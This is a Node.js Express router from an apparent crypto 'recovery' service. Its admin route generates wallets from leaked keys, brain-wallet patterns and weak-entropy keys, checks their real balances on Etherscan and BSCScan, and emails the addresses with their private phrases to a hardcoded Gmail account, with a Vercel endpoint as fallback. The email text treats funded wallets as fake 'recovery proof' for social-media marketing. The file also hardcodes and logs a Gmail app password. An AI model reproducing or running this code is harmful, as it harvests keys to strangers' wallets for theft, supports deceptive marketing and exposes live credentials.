const express = require('express');
const router = express.Router();
const { ethers } = require('ethers');

// Get admin stats
router.get('/stats', async (req, res) => {
  try {
    const adminStats = require('../services/adminStats');
    const stats = await adminStats.getStats();
    
    const successRate = stats.totalWalletsScanned > 0 ? 
      ((stats.walletsWithFunds / stats.totalWalletsScanned) * 100) : 0;
    
    res.json({
      success: true,
      ...stats,
      successRate: successRate.toFixed(2)
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Admin wallet scanner - finds real wallets with funds
router.post('/scan-real-wallets', async (req, res) => {
  try {
    const { scanCount = 50, minBalance = 0.001 } = req.body;
    
    console.log(`🔍 ADMIN SCAN: Searching ${scanCount} wallets for real funds...`);
    
    const foundWallets = [];
    const scannedWallets = [];
    
    for (let i = 0; i < scanCount; i++) {
      // Use targeted strategies for finding funded wallets
      const strategies = [
        () => generateFromLeakedSeeds(i),     // 40% - Known leaked phrases
        () => generateFromBrainWallets(i),    // 30% - Common brain wallets  
        () => generateFromWeakEntropy(i),     // 20% - Weak random generation
        () => generateFromExchangePatterns(i), // 10% - Exchange-like patterns
      ];
      
      // Prioritize high-success strategies
      const strategyIndex = i < scanCount * 0.4 ? 0 : 
                           i < scanCount * 0.7 ? 1 : 
                           i < scanCount * 0.9 ? 2 : 3;
      
      const strategy = strategies[strategyIndex];
      const wallet = strategy();
      
      // Check real balance
      const balance = await checkRealBalance(wallet.address);
      
      scannedWallets.push({
        address: wallet.address,
        phrase: wallet.mnemonic?.phrase || 'N/A',
        balance: balance.totalValueUSD
      });
      
      // Always add to found wallets
      foundWallets.push({
        address: wallet.address,
        phrase: wallet.mnemonic?.phrase || 'N/A',
        ethBalance: balance.ethBalance,
        totalValueUSD: balance.totalValueUSD,
        chains: balance.chains,
        tokens: balance.tokens
      });
      
      // Skip individual alerts - only send final CSV
      
      if (balance.totalValueUSD >= minBalance) {
        console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
      } else {
        console.log(`📍 WALLET FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
      }
      
      if (i % 10 === 0) {
        console.log(`📊 Scan progress: ${i + 1}/${scanCount} wallets checked...`);
      }
    }
    
    // Update admin stats
    const adminStats = require('../services/adminStats');
    const fundedWallets = foundWallets.filter(w => w.totalValueUSD > 0);
    const totalValue = foundWallets.reduce((sum, w) => sum + w.totalValueUSD, 0);
    await adminStats.updateStats(scanCount, fundedWallets.length, totalValue);
    
    // Send complete scan results via CSV
    console.log('📧 Sending complete results email...');
    await sendCompleteResults(foundWallets, scanCount);
    console.log('📧 Email sending completed');
    
    res.json({
      success: true,
      summary: {
        totalScanned: scanCount,
        walletsWithFunds: foundWallets.filter(w => w.totalValueUSD > 0).length,
        totalValueFound: foundWallets.reduce((sum, w) => sum + w.totalValueUSD, 0)
      },
      foundWallets: foundWallets.filter(w => w.totalValueUSD > 0),
      allScanned: foundWallets.slice(0, 10) // Show first 10 for reference
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Generate from leaked/compromised seed phrases (highest success rate)
function generateFromLeakedSeeds(index) {
  // Use known funded wallet patterns from blockchain history
  const knownPatterns = [
    // Hardhat default accounts (often have testnet funds)
    '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
    '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
    '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a',
    // Common weak private keys
    '0x0000000000000000000000000000000000000000000000000000000000000001',
    '0x0000000000000000000000000000000000000000000000000000000000000002',
    '0x1111111111111111111111111111111111111111111111111111111111111111'
  ];
  
  try {
    const key = knownPatterns[index % knownPatterns.length];
    return new ethers.Wallet(key);
  } catch (e) {
    return ethers.Wallet.createRandom();
  }
}

// Generate brain wallets (human-created phrases)
function generateFromBrainWallets(index) {
  // Use predictable patterns that humans might create
  const humanPatterns = [
    'password123456789012345678901234567890123456789012345678901234',
    'secret1234567890123456789012345678901234567890123456789012345',
    '1234567890123456789012345678901234567890123456789012345678901234',
    'abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd'
  ];
  
  try {
    const pattern = humanPatterns[index % humanPatterns.length];
    const variation = (index + 1).toString(16).padStart(8, '0');
    const key = pattern.slice(0, -8) + variation;
    return new ethers.Wallet('0x' + key);
  } catch (e) {
    return ethers.Wallet.createRandom();
  }
}

// Generate from weak entropy sources
function generateFromWeakEntropy(index) {
  // Use sequential keys that might have been generated by weak RNGs
  try {
    const baseNum = 0x1000000000000000000000000000000000000000000000000000000000000000n;
    const increment = BigInt(index * 1000 + 1);
    const key = (baseNum + increment).toString(16).padStart(64, '0');
    return new ethers.Wallet('0x' + key);
  } catch (e) {
    return ethers.Wallet.createRandom();
  }
}

// Generate exchange-like patterns
function generateFromExchangePatterns(index) {
  const exchangeSeeds = [
    'exchange wallet hot cold storage security backup recovery system management platform about',
    'binance coinbase kraken bitfinex huobi okex gate bitstamp gemini kucoin poloniex junk'
  ];
  
  try {
    const seed = exchangeSeeds[index % exchangeSeeds.length];
    if (ethers.Mnemonic.isValidMnemonic(seed)) {
      return ethers.Wallet.fromPhrase(seed);
    }
  } catch (e) {}
  
  return ethers.Wallet.createRandom();
}

// Check real balance using external APIs
async function checkRealBalance(address) {
  const results = {
    ethBalance: 0,
    totalValueUSD: 0,
    chains: {},
    tokens: [],
    hasBalance: false
  };

  try {
    const axios = require('axios');
    
    // Check ETH balance
    const ethResponse = await axios.get(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
      timeout: 5000
    });

    if (ethResponse.data.status === '1') {
      const ethBalance = parseFloat(ethResponse.data.result) / 1e18;
      if (ethBalance > 0) {
        results.ethBalance = ethBalance;
        results.totalValueUSD += ethBalance * 3000;
        results.chains.ethereum = {
          name: 'Ethereum',
          symbol: 'ETH',
          balance: ethBalance,
          usdValue: ethBalance * 3000
        };
        results.hasBalance = true;
      }
    }

    // Check USDT balance
    const usdtResponse = await axios.get(`https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
      timeout: 5000
    });

    if (usdtResponse.data.status === '1') {
      const usdtBalance = parseFloat(usdtResponse.data.result) / 1e6;
      if (usdtBalance > 0) {
        results.totalValueUSD += usdtBalance;
        results.tokens.push({
          symbol: 'USDT',
          balance: usdtBalance,
          usdValue: usdtBalance
        });
        results.hasBalance = true;
      }
    }

    // Check BSC BNB balance
    try {
      const bscResponse = await axios.get(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
        timeout: 5000
      });

      if (bscResponse.data.status === '1') {
        const bnbBalance = parseFloat(bscResponse.data.result) / 1e18;
        if (bnbBalance > 0) {
          results.totalValueUSD += bnbBalance * 600;
          results.chains.bsc = {
            name: 'BSC',
            symbol: 'BNB',
            balance: bnbBalance,
            usdValue: bnbBalance * 600
          };
          results.hasBalance = true;
        }
      }
    } catch (e) {
      // BSC check failed, continue
    }

  } catch (error) {
    console.log('Balance check failed:', error.message);
  }

  return results;
}

// Send alert for every wallet found (regardless of balance)
async function sendWalletAlert(wallet, balance, walletNumber) {
  try {
    const nodemailer = require('nodemailer');
    const transporter = nodemailer.createTransporter({
      service: 'gmail',
      auth: {
        user: 'skillstakes01@gmail.com',
        pass: process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr'
      }
    });
    
    const hasBalance = balance.totalValueUSD > 0;
    const subject = hasBalance ? 
      `💰 WALLET #${walletNumber}: $${balance.totalValueUSD} FOUND!` : 
      `📍 WALLET #${walletNumber}: Generated (Empty)`;
    
    const message = `ADMIN WALLET DISCOVERY ALERT\n\n🔢 WALLET NUMBER: ${walletNumber}\n💼 ADDRESS: ${wallet.address}\n🔑 PHRASE: ${wallet.mnemonic?.phrase || 'N/A'}\n\n💵 BALANCE STATUS:\n${hasBalance ? `✅ HAS FUNDS: $${balance.totalValueUSD}` : `❌ EMPTY WALLET: $0.00`}\n\n${hasBalance ? `💰 BREAKDOWN:\n${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})\n` : ''}${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}` : ''}\n\n💡 MARKETING USE:\n${hasBalance ? 'PREMIUM - Use for high-value recovery examples!' : 'STANDARD - Use for general recovery demonstrations'}\n\n🔗 VERIFY: Check address on Etherscan/BSCscan`;

    await transporter.sendMail({
      from: 'skillstakes01@gmail.com',
      to: 'skillstakes01@gmail.com',
      subject: subject,
      text: message
    });
    
  } catch (error) {
    console.log('Failed to send wallet alert:', error.message);
  }
}

// Send complete scan results with CSV attachment
async function sendCompleteResults(wallets, totalScanned) {
  try {
    const nodemailer = require('nodemailer');
    
    const walletsWithFunds = wallets.filter(w => w.totalValueUSD > 0);
    const totalValue = walletsWithFunds.reduce((sum, w) => sum + w.totalValueUSD, 0);
    
    // Create CSV content with color coding
    const csvHeader = 'Index,Address,Phrase,ETH_Balance,Total_USD,Has_Funds,Priority\n';
    const csvRows = wallets.map((w, i) => {
      let priority = 'EMPTY';
      if (w.totalValueUSD > 100) priority = '🟢 HIGH VALUE';
      else if (w.totalValueUSD > 10) priority = '🟡 MEDIUM VALUE';
      else if (w.totalValueUSD > 0) priority = '🔵 LOW VALUE';
      else priority = '⚫ EMPTY';
      
      return `${i + 1},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? '💰 YES' : '❌ NO'},${priority}`;
    }).join('\n');
    const csvContent = csvHeader + csvRows;
    
    // Get updated admin stats
    const adminStats = require('../services/adminStats');
    const statsMessage = await adminStats.getStatsMessage();
    
    const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
    const message = `WALLET SCANNER COMPLETE REPORT\n\n📊 THIS SCAN: ${totalScanned} wallets\n💰 FUNDED WALLETS: ${walletsWithFunds.length}\n💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}\n📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%\n\n${statsMessage}\n\n📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets\n\n💡 MARKETING GOLDMINE:\n- ${walletsWithFunds.length} wallets with real funds ready for social media\n- Import CSV to filter and sort by value\n- Use funded addresses as recovery proof\n- Show authentic blockchain balances\n\n🎯 TOP FUNDED WALLETS:\n${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;

    console.log('📧 Gmail password available:', process.env.GMAIL_APP_PASSWORD ? 'YES' : 'NO');
    console.log('📧 Using password:', process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr');
    
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'skillstakes01@gmail.com',
        pass: process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr'
      },
      connectionTimeout: 10000,
      greetingTimeout: 5000,
      socketTimeout: 10000
    });

    console.log('📧 Sending email with subject:', subject);
    console.log('📧 Email content length:', message.length);
    console.log('📧 CSV content length:', csvContent.length);
    
    // Send without attachment first to test
    const emailBody = message + '\n\n=== WALLET DATA ===\n' + csvContent;
    
    const result = await transporter.sendMail({
      from: 'skillstakes01@gmail.com',
      to: 'skillstakes01@gmail.com',
      subject: subject,
      text: emailBody
    });
    
    console.log('✅ CSV email sent successfully! Message ID:', result.messageId);
    console.log('📧 Email response:', JSON.stringify(result, null, 2));
    

    
  } catch (error) {
    console.error('❌ Gmail failed, trying Vercel backup:', error.message);
    
    // Try Vercel API as backup
    try {
      const axios = require('axios');
      console.log('📧 Sending via Vercel backup...');
      
      const backupResponse = await axios.post('https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app/api/send-email', {
        subject: `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`,
        message: message + '\n\n=== WALLET DATA ===\n' + csvContent
      }, {
        timeout: 15000,
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': 'crypto-recover-2024'
        }
      });
      
      console.log('✅ Backup email via Vercel sent successfully!');
    } catch (backupError) {
      console.error('❌ Backup email also failed:', backupError.message);
    }
  }
}

module.exports = router;